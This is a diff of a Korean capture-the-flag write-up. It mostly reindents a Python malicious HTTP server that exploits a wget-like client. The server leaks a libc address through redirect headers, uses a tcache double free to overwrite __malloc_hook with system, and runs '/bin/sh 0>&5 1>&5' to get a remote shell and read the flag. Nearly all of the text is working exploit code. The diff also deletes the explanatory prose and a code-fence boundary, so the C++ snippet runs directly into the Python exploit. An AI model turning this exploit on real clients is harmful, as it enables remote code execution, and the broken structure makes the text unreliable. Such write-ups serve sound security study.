@@ -145,22 +145,13 @@ return omega_get(redirect);
 ```
 이 부분에서 **redirect** 가 할당되어 있는 경우 재귀호출을 통해 리다이렉션을 수행한다. 여기서 앞서 살펴 본 바에 따르면, **location** 에 **http://** 로 시작하는 url이나 **/** 로 시작하는 문자열을 보내면 그 뒤에 널 바이트가 붙지 않아 발생한 릭이 url에 붙게 된다. 익스플로잇에서는 하나의 공격 서버만 사용할 것이므로 모두 **/** 로 시작하는 리다이렉션 주소를 보낼 것이다. 그러면, **omega_get** 에서 다시 불린 **download_file** 함수에 릭이 포함된 **path** 가 들어가고, 
 ```c++
-request = malloc(SIZE_HEADER + strlen(path) + strlen(host) + 1);
-sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", path, host, port);
-write(sock, request, strlen(request));
-```
-이 부분에 의해 **path** 가 서버로 전송되면서 서버는 프로그램의 릭을 획득할 수 있다.
-
-## 2. Actual Exploit
-다음은 *server.py* 코드이다.
-```python
 #/usr/bin/env !python3
 
 import socket
 from pwn import *
 
 payload1 = b'content-length: 255\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\n' + \
-			b'content-length: 100\r\nlocation: ///xxxxx\r\n' + b'\0\r\n'
+            b'content-length: 100\r\nlocation: ///xxxxx\r\n' + b'\0\r\n'
 
 catflag = b';' * 0x1e0 + b'cat flag;'
 
@@ -182,79 +173,79 @@ system = 0
 
 # serrver function
 def run_server(host="127.0.0.1", port=4000):
-	add_flag = 0 # phase
-	g_con = None # global connection
-	with socket.socket() as s:
-		s.bind((host, port))
-		s.listen(5) # listen
-		while True:
-			conn, addr = s.accept()
-			g_con = conn
+    add_flag = 0 # phase
+    g_con = None # global connection
+    with socket.socket() as s:
+        s.bind((host, port))
+        s.listen(5) # listen
+        while True:
+            conn, addr = s.accept()
+            g_con = conn
 
-			msg = conn.recv(1024) # get request from wget client
-			print("requset size : " + str(len(msg)))
-			print(msg) # print request
+            msg = conn.recv(1024) # get request from wget client
+            print("requset size : " + str(len(msg)))
+            print(msg) # print request
 
-			if b'/xx' in msg: # phase 2 : get leak
-				leak = u64(msg[12:18] + b'\0\0')
-				print("LEAK : " + hex(leak))
-				malloc_hook = leak - 0x7ffff7dcfca0 + 0x7ffff7dcfc30 - 1
-				system = leak - 0x7ffff7dcfca0 + 0x7ffff7a33440
-				print(payload2)
-				conn.sendall(payload2)
-			elif b'/ ' in  msg: # phase 1 : make leak
-				print("MAKING LEAK")
-				conn.sendall(payload1)
-			elif b'/11' in msg: # phase 4 : arbitry writing
+            if b'/xx' in msg: # phase 2 : get leak
+                leak = u64(msg[12:18] + b'\0\0')
+                print("LEAK : " + hex(leak))
+                malloc_hook = leak - 0x7ffff7dcfca0 + 0x7ffff7dcfc30 - 1
+                system = leak - 0x7ffff7dcfca0 + 0x7ffff7a33440
+                print(payload2)
+                conn.sendall(payload2)
+            elif b'/ ' in  msg: # phase 1 : make leak
+                print("MAKING LEAK")
+                conn.sendall(payload1)
+            elif b'/11' in msg: # phase 4 : arbitry writing
 
-				if add_flag != 0: # write __malloc_hook
-					payload4 = payload4_f + b'location: ' + p64((malloc_hook & 0xffffffffffffff00) | 0x2f) + b'\r\nlocation: /1\r\n' + b'location: /' + p64(system) + b'\r\ncontent-length: ' + str(((malloc_hook & 0xffffffffffffff00) | 0x2f) + 0x1300).encode() + payload4_b
-					add_flag = 2 # attack ends
+                if add_flag != 0: # write __malloc_hook
+                    payload4 = payload4_f + b'location: ' + p64((malloc_hook & 0xffffffffffffff00) | 0x2f) + b'\r\nlocation: /1\r\n' + b'location: /' + p64(system) + b'\r\ncontent-length: ' + str(((malloc_hook & 0xffffffffffffff00) | 0x2f) + 0x1300).encode() + payload4_b
+                    add_flag = 2 # attack ends
 
-				else: # write "/bin/sh 0>&5 1>&5" remote shell command
-					payload4 = payload4_f + b'location: ' + p64(((malloc_hook & 0xffffffffffffff00) | 0x2f) + 0x1300) + b'\r\nlocation: /1\r\n' + \
-						b'location: /\n/bin/sh 0>&5 1>&5\r\nlocation: /;' + b';' * 130 + payload4_b
-					add_flag = 1 # command prepared
+                else: # write "/bin/sh 0>&5 1>&5" remote shell command
+                    payload4 = payload4_f + b'location: ' + p64(((malloc_hook & 0xffffffffffffff00) | 0x2f) + 0x1300) + b'\r\nlocation: /1\r\n' + \
+                        b'location: /\n/bin/sh 0>&5 1>&5\r\nlocation: /;' + b';' * 130 + payload4_b
+                    add_flag = 1 # command prepared
 
-				print(payload4)
-				conn.sendall(payload4)
+                print(payload4)
+                conn.sendall(payload4)
 
-				if add_flag ==2: # attacking loop ends
-					break
+                if add_flag ==2: # attacking loop ends
+                    break
 
-			elif b'/;' in msg: # tcache double free : size 0x20 again
-				print("Erm...")
-				conn.sendall(payload5)
+            elif b'/;' in msg: # tcache double free : size 0x20 again
+                print("Erm...")
+                conn.sendall(payload5)
 
-			elif b'/@' in msg: # unused
-				conn.sendall(b'content-length: 10\r\n\0\r\naaaa')
+            elif b'/@' in msg: # unused
+                conn.sendall(b'content-length: 10\r\n\0\r\naaaa')
 
-			elif b'/1' in msg: # tcache double free : size 0x20
-				conn.sendall(payload3)
+            elif b'/1' in msg: # tcache double free : size 0x20
+                conn.sendall(payload3)
 
-			else: # unused
-				conn.sendall(b'content-length: ' + str(system).encode() + b'\r\n\0\r\n!CONTENT!')
-				# fianl
+            else: # unused
+                conn.sendall(b'content-length: ' + str(system).encode() + b'\r\n\0\r\n!CONTENT!')
+                # fianl
 
-		while True: #interactive mode
-			# ls -al
-			# cat woa_u_got_flag.txt 0>&5 1>&5
-			g_con.sendall(input())
-			msg = g_con.recv(1024)
-			print(msg.decode())
-		conn.close()
+        while True: #interactive mode
+            # ls -al
+            # cat woa_u_got_flag.txt 0>&5 1>&5
+            g_con.sendall(input())
+            msg = g_con.recv(1024)
+            print(msg.decode())
+        conn.close()
 
 if __name__ == '__main__':
-	p = 9092
-	while True:
-		try:
-			print(p)
-			run_server('', p)
-			break
-		except KeyboardInterrupt:
-			break
-		except:
-			p += 1
+    p = 9092
+    while True:
+        try:
+            print(p)
+            run_server('', p)
+            break
+        except KeyboardInterrupt:
+            break
+        except:
+            p += 1
 ```
 익스플로잇의 흐름은 앞서 살펴봤듯, 릭의 획득과 원격 쉘의 획득 두 가지 과정으로 나뉜다. 실제 익스플로잇에서 사용된 주목할 만 한 사항은 아래와 같다.
 * 1. **tcache**에 들어가는 조금 큰 사이즈 청크를 8번 free해 **libc main arena** 의 주소가 청크에 적히게 한다.
